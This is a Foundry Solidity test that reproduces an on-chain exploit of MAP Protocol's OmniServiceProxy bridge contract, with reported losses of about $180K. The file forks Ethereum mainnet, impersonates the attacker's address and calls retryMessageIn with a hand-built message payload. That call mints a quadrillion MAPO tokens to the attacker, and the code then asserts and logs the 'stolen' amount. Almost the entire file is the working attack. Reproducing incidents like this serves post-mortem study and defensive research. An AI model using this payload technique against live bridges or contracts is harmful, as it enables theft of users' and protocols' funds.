// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$180K
// Attacker : https://etherscan.io/address/0x40592025392bd7d7463711c6e82ed34241b64279
// Attack Contract : https://etherscan.io/address/0x2475396a308861559ef30dc46aad6136367a1c30
// Vulnerable Contract : https://etherscan.io/address/0x0000317bec33af037b5fab2028f52d14658f6a56
// Attack Tx : https://etherscan.io/tx/0x31e56b4737649e0acdb0ebb4eca44d16aeca25f60c022cbde85f092bde27664a
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x0000317bec33af037b5fab2028f52d14658f6a56#code
//
// @Analysis
// Post-mortem : https://x.com/MapProtocol/status/2059587998409490510

contract MAPProtocolTest is Test {
    bytes32 internal constant TX_HASH = 0x31e56b4737649e0acdb0ebb4eca44d16aeca25f60c022cbde85f092bde27664a;
    uint256 internal constant FORK_BLOCK = 25_137_571;

    address internal constant ATTACKER = 0x40592025392BD7d7463711c6E82Ed34241B64279;
    address internal constant EXPLOIT_CONTRACT = 0x2475396A308861559EF30dc46aad6136367a1C30;
    IMAPOmniServiceProxy internal constant OMNI_SERVICE_PROXY = IMAPOmniServiceProxy(0x0000317Bec33Af037b5fAb2028f52d14658F6A56);
    IERC20 internal constant MAPO = IERC20(0x66D79B8f60ec93Bfce0b56F5Ac14A2714E509a99);

    uint256 internal constant MINTED_MAPO = 1_000_000_000_000_000 ether;
    bytes32 internal constant MESSAGE_ROOT = 0x1de78eb8658305a581b2f1610c96707b0204d5cba6a782b313672045fa5a87c8;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        vm.label(ATTACKER, "Attacker");
        vm.label(EXPLOIT_CONTRACT, "Exploit Contract");
        vm.label(address(OMNI_SERVICE_PROXY), "OmniServiceProxy");
        vm.label(address(MAPO), "MAPO");
    }

    function testExploit() public {
        uint256 beforeMapo = MAPO.balanceOf(ATTACKER);
        bytes memory mintParams =
            abi.encode(abi.encodePacked(ATTACKER), abi.encodePacked(ATTACKER), MINTED_MAPO, uint256(18));
        bytes memory messagePayload = abi.encode(
            uint256(1),
            uint256(10_000),
            abi.encodePacked(EXPLOIT_CONTRACT, EXPLOIT_CONTRACT, EXPLOIT_CONTRACT),
            abi.encodePacked(address(MAPO)),
            abi.encode(MESSAGE_ROOT, mintParams)
        );

        vm.prank(ATTACKER, ATTACKER);
        OMNI_SERVICE_PROXY.retryMessageIn(
            142_967_269_125_167_041_077_124_280_185_344_731_231_610_710_977_720_281_833_930_752,
            0xf2fbaa8a33bc05e0454299f2d43ed99fdb5cf024770484bbb598ace5e0c7d4a4,
            address(0),
            0,
            hex"1ad1a4a19bc9983a98f5d9ac8442c6dfc4276167",
            messagePayload,
            ""
        );

        uint256 mintedMapo = MAPO.balanceOf(ATTACKER) - beforeMapo;
        assertEq(mintedMapo, MINTED_MAPO, "MAPO mint mismatch");

        console.log("Stolen MAPO", mintedMapo);
    }
}

interface IMAPOmniServiceProxy {
    function retryMessageIn(
        uint256 fromChain,
        bytes32 orderId,
        address token,
        uint256 amount,
        bytes calldata from,
        bytes calldata message,
        bytes calldata proof
    ) external;
}
